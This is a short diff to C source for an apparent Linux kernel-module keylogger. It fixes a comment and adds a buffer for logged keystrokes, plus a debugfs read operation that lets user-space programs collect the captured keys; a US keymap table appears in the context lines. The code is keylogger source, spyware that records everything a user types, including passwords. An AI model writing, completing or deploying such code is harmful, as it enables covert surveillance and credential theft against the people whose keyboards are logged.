@@ -10,7 +10,7 @@
 #define KEYCODE_LEN 12 // Maximum length of a keycode string
 #define US 0 // Type code for US character log
 #define HEX 1 // Type code for hexadecimal log
-#define DEC 2 //Type code for decimal log
+#define DEC 2 // Type code for decimal log
 
 // Declarations
 static int codes; // User-specified log pattern
@@ -68,4 +68,19 @@ static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
 	{"_PAUSE_", "_PAUSE_"},                                         // 119
 };
+
+// Buffer to store the logged keys
+static size_t buf_pos;
+static char keys_buf[BUF_LEN];
+
+// Debugfs file operations
+const struct file_operations keys_fops = {
+	.owner = THIS_MODULE,
+	.read = keys_read,
+};
+
+// Read function to allow user-space programs to read logged keys from the Debugfs file
+static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
+    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+}
 
